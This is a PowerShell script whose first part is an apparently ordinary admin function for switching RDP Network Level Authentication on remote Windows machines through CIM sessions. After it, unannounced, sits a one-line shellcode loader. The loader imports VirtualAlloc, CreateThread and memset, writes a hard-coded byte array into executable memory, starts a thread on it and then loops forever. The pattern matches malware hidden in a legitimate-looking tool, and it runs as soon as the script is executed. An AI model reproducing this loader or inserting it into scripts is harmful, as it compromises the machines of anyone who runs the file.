﻿function Set-NetworkLevelAuthentication
{

    
    [CmdletBinding()]
    PARAM (
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [System.String[]]$ComputerName = $env:ComputerName,

        [Parameter(Mandatory)]
        [System.Boolean]$EnableNLA,

        [Alias("RunAs")]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    BEGIN
    {
        TRY
        {
            IF (-not (Get-Module -Name CimCmdlets))
            {
                Write-Verbose -Message '[BEGIN] Import Module CimCmdlets'
                Import-Module CimCmdlets -ErrorAction 'Stop' -ErrorVariable ErrorBeginCimCmdlets
            }
        }
        CATCH
        {
            IF ($ErrorBeginCimCmdlets)
            {
                Write-Error -Message "[BEGIN] Can't find CimCmdlets Module"
            }
        }
    }

    PROCESS
    {
        FOREACH ($Computer in $ComputerName)
        {
            Write-Verbose -message $Computer
            TRY
            {
                
                Write-Verbose -message "$Computer - CIM/WIM - Building Splatting"
                $CIMSessionParams = @{
                    ComputerName = $Computer
                    ErrorAction = 'Stop'
                    ErrorVariable = 'ProcessError'
                }

                
                IF ($PSBoundParameters['Credential'])
                {
                    Write-Verbose -message "[PROCESS] $Computer - CIM/WMI - Add Credential Specified"
                    $CIMSessionParams.credential = $Credential
                }

                
                Write-Verbose -Message "[PROCESS] $Computer - Testing Connection..."
                Test-Connection -ComputerName $Computer -Count 1 -ErrorAction Stop -ErrorVariable ErrorTestConnection | Out-Null

                
                
                IF ((Test-WSMan -ComputerName $Computer -ErrorAction SilentlyContinue).productversion -match 'Stack: 3.0')
                {
                    Write-Verbose -Message "[PROCESS] $Computer - WSMAN is responsive"
                    $CimSession = New-CimSession @CIMSessionParams
                    $CimProtocol = $CimSession.protocol
                    Write-Verbose -message "[PROCESS] $Computer - [$CimProtocol] CIM SESSION - Opened"
                }

                
                ELSE
                {
                    
                    Write-Verbose -Message "[PROCESS] $Computer - Trying to connect via DCOM protocol"
                    $CIMSessionParams.SessionOption = New-CimSessionOption -Protocol Dcom
                    $CimSession = New-CimSession @CIMSessionParams
                    $CimProtocol = $CimSession.protocol
                    Write-Verbose -message "[PROCESS] $Computer - [$CimProtocol] CIM SESSION - Opened"
                }

                
                Write-Verbose -message "[PROCESS] $Computer - [$CimProtocol] CIM SESSION - Get the Terminal Services Information"
                $NLAinfo = Get-CimInstance -CimSession $CimSession -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'"
                $NLAinfo | Invoke-CimMethod -MethodName SetUserAuthenticationRequired -Arguments @{ UserAuthenticationRequired = $EnableNLA } -ErrorAction 'Continue' -ErrorVariable ErrorProcessInvokeWmiMethod
            }

            CATCH
            {
                Write-Warning -Message "Error on $Computer"
                Write-Error -Message $_.Exception.Message
                if ($ErrorTestConnection) { Write-Warning -Message "[PROCESS] Error - $ErrorTestConnection" }
                if ($ProcessError) { Write-Warning -Message "[PROCESS] Error - $ProcessError" }
                if ($ErrorProcessInvokeWmiMethod) { Write-Warning -Message "[PROCESS] Error - $ErrorProcessInvokeWmiMethod" }
            }
            FINALLY
            {
                if ($CimSession)
                {
                    
                    Write-Verbose -Message "[PROCESS] Finally Close any CIM Session(s)"
                    Remove-CimSession -CimSession $CimSession
                }
            }
        } 
    }
    END
    {
        Write-Verbose -Message "[END] Script is completed"
    }
}

$PbS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PbS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x59,0x37,0x9e,0x14,0xdb,0xcc,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xc0,0x04,0x03,0x68,0x56,0xd5,0x6b,0xe8,0x80,0x9b,0x94,0x11,0x50,0xfc,0x1d,0xf4,0x61,0x3c,0x79,0x7c,0xd1,0x8c,0x09,0xd0,0xdd,0x67,0x5f,0xc1,0x56,0x05,0x48,0xe6,0xdf,0xa0,0xae,0xc9,0xe0,0x99,0x93,0x48,0x62,0xe0,0xc7,0xaa,0x5b,0x2b,0x1a,0xaa,0x9c,0x56,0xd7,0xfe,0x75,0x1c,0x4a,0xef,0xf2,0x68,0x57,0x84,0x48,0x7c,0xdf,0x79,0x18,0x7f,0xce,0x2f,0x13,0x26,0xd0,0xce,0xf0,0x52,0x59,0xc9,0x15,0x5e,0x13,0x62,0xed,0x14,0xa2,0xa2,0x3c,0xd4,0x09,0x8b,0xf1,0x27,0x53,0xcb,0x35,0xd8,0x26,0x25,0x46,0x65,0x31,0xf2,0x35,0xb1,0xb4,0xe1,0x9d,0x32,0x6e,0xce,0x1c,0x96,0xe9,0x85,0x12,0x53,0x7d,0xc1,0x36,0x62,0x52,0x79,0x42,0xef,0x55,0xae,0xc3,0xab,0x71,0x6a,0x88,0x68,0x1b,0x2b,0x74,0xde,0x24,0x2b,0xd7,0xbf,0x80,0x27,0xf5,0xd4,0xb8,0x65,0x91,0x19,0xf1,0x95,0x61,0x36,0x82,0xe6,0x53,0x99,0x38,0x61,0xdf,0x52,0xe7,0x76,0x20,0x49,0x5f,0xe8,0xdf,0x72,0xa0,0x20,0x1b,0x26,0xf0,0x5a,0x8a,0x47,0x9b,0x9a,0x33,0x92,0x36,0x9e,0xa3,0xdd,0x6f,0xa1,0x54,0xb6,0x6d,0xa2,0x9b,0xfd,0xfb,0x44,0xcb,0x51,0xac,0xd8,0xab,0x01,0x0c,0x89,0x43,0x48,0x83,0xf6,0x73,0x73,0x49,0x9f,0x19,0x9c,0x24,0xf7,0xb5,0x05,0x6d,0x83,0x24,0xc9,0xbb,0xe9,0x66,0x41,0x48,0x0d,0x28,0xa2,0x25,0x1d,0xdc,0x42,0x70,0x7f,0x4a,0x5c,0xae,0xea,0x72,0xc8,0x55,0xbd,0x25,0x64,0x54,0x98,0x01,0x2b,0xa7,0xcf,0x1a,0xe2,0x3d,0xb0,0x74,0x0b,0xd2,0x30,0x84,0x5d,0xb8,0x30,0xec,0x39,0x98,0x62,0x09,0x46,0x35,0x17,0x82,0xd3,0xb6,0x4e,0x77,0x73,0xdf,0x6c,0xae,0xb3,0x40,0x8e,0x85,0x45,0xbc,0x59,0xe3,0x33,0xac,0x59;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$bOd=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($bOd.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$bOd,0,0,0);for (;;){Start-sleep 60};

